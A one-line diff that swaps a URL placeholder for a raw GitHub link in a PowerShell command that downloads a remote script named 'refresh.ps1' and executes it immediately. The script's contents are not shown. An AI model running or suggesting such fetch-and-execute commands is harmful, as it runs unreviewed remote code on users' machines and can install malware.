@@ -1,1 +1,1 @@
-powershell -c "irm YOUR_RAW_FILE_URL | iex"
+powershell -c "irm 'https://raw.githubusercontent.com/sonalimogg-cyber/refresh/main/refresh.ps1' | iex"
